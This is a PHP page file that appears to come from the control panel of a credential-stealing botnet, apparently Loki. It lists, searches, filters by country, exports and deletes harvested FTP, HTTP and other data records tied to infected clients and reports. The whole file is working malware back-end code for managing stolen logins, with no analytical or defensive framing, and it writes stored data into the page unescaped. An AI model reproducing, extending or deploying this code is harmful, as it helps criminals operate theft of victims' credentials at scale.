<?php
	if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) die();

	$Country = NULL;
	$Text	 = NULL;
	$PageSearch = '';
	$ExportTxt = GetText_('http_export_all', FALSE);
	$DeleteTxt = GetText_('http_delete_all', FALSE);
	
	if(isset($_REQUEST['st']))
	{
		$Text = explode(" ", trim($_REQUEST['st']));
		$PageSearch = '&st=' . trim($_REQUEST['st']);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	if(isset($_REQUEST['sc'][0]) && $_SERVER["REQUEST_METHOD"] == "POST")
	{
		$Country = $_REQUEST['sc'];
		$PageSearch = '&sc=' . implode('|', $Country);
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else if(isset($_REQUEST['sc']) && $_SERVER["REQUEST_METHOD"] == "GET")
	{
		$PageSearch = '&sc=' . trim($_REQUEST['sc']);
		$Country = explode("|", $_REQUEST['sc']);
		
		$ExportTxt = GetText_('http_export_selected', FALSE);
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	
	if(isset($Option_) && strlen($Option_))
	{
		if($Option_ == 'flush')
		{
			$ID_ = NULL;

			if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
				$ID_ = trim($_REQUEST['id']);

			if($Action == 'ftp')
				$LokiDBCon->DeleteData("ftp", $ID_, $Text, $Country);
			else if($Action == 'http')
				$LokiDBCon->DeleteData("http", $ID_, $Text, $Country);
			else if($Action == 'other')
				$LokiDBCon->DeleteData("data", $ID_, $Text, $Country);
			
			$Text = NULL;
			$Country = NULL;
			
			$ExportTxt = GetText_('http_export_all', FALSE);
			$DeleteTxt = GetText_('http_delete_all', FALSE);
		}
		else if($Option_ == 'export')
		{
			if($Action == 'ftp')
			{
				SetDownloadHeader("FTP_Export_" . NowDate("Ymd_His") . EXTENSION_);
				$LokiDBCon->ExportAllFTPData($Text, $Country);
			}
			else if($Action == 'http')
			{
				SetDownloadHeader("HTTP_Export_" . NowDate("Ymd_His") . EXTENSION_);
				$LokiDBCon->ExportAllHTTPData($Text, $Country);
			}
			else if($Action == 'other')
			{
				$LokiDBCon->ExportAllDATAData($Text, $Country);
			}

			die_();
		}
	}

	$DataTable = '';

	if($Action == 'ftp')
		$DataTable = $LokiDBCon->GetData('ftp', $StartFrom, $PageLimit, NULL, $Text, $Country);
	else if($Action == 'http')
		$DataTable = $LokiDBCon->GetData('http', $StartFrom, $PageLimit, NULL, $Text, $Country);
	else if($Action == 'other')
		$DataTable = $LokiDBCon->GetData('data', $StartFrom, $PageLimit, NULL, $Text, $Country);

	$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);

	if((isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] != 0) && isset($DataTable[0]["data_id"]))
	{
		$LINK_Delete = $LINK_Delete . $DataTable[0]["data_id"];
	}
?>
			<div class="row">
				<div class='col-md-0 sidebar'></div>
				<div class='col-md-12 main'>
				<?php
					$Disabled = (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0);
					$TableMenu = 
					array
					(
						array($LINK_Export.$PageSearch, $ExportTxt, $Disabled),
						array($LINK_Delete.$PageSearch, $DeleteTxt, $Disabled, "CONFIRM"),
						array("onvisible",GetText_('table_show_search', FALSE), $Disabled),
						array('st', '?'.ACTVALUE_.'='.$Action, $Disabled, 'INPUT'),
						array(GetCountrys(), GetText_('table_all_country', FALSE), $Disabled, 'MULTISELECT'),
						array(0, GetText_('table_search', FALSE), $Disabled, 'FORMEND'),
					);

					GetTableMenu($TableMenu, $ID_ = "table_menu")
				?>
	
				<table class="table-condensed" id="events_" data-toggle="table" data-toolbar="#table_menu" data-show-columns="true">
					<thead>
						<tr>
							<th data-sortable="true"  data-field="data"><?php GetText_('http_table_data'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('http_table_client'); ?></th>
							<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('http_table_report'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('http_table_time'); ?></th>
						</tr>
					</thead>	
					<tbody>
					<?php
					$Counter = 0;
					while($DataTable["NumOfData"] > $Counter)
					{
						$OutDat = '';
						if($DataTable[$Counter]["data_type"] == "datadl")
						{
							$Name = explode("|", $DataTable[$Counter]["data_text"]);
							$OutDat = FormatDatadl(FormatShort($Name[0]), $DataTable[$Counter]["data_type"], $DataTable[$Counter]["data_id"]);
						}
						else if($DataTable[$Counter]["data_type"] == "mail")
							$OutDat = FormatMail($DataTable[$Counter]["data_text"]);
						else
							$OutDat = $DataTable[$Counter]["data_text"];
						
						$DataRead = '';
						if($DataTable[$Counter]["data_client"] == 202)
						{
							$Dr_Title = '<img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" src="'.INCLUDE_.'/style/icon/read.png" alt="" height="16" width="16">';
							$DataRead = '<a target="blank" href="'. "?" . ACTVALUE_ . "=download&opti=datar&id=" . $DataTable[$Counter]["data_id"] . '">' . $Dr_Title . '</a>';
						}
						
						echo '<tr>
									<td>'.$OutDat."	". $DataRead.'</td>
									<td>'.FormatIcon($DataTable[$Counter]["data_client"], FALSE).'</td>
									<td><a href="' .$LINK_Report.$DataTable[$Counter]["report_id"]. '">Open</a></td>
									<td>'.NowDate(NULL, $DataTable[$Counter]["data_time"]).'</td>
								</tr>';
						$Counter++;
					} 
					?>
					</tbody>
				</table>

				<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch."&tD=".$DataTable["NumOfTotal"], $DataTable); ?>
				</div>
				
				<div class='col-md-0 sidebar'></div>
			 </div>
        </div>
    </div>
</body>

</html>
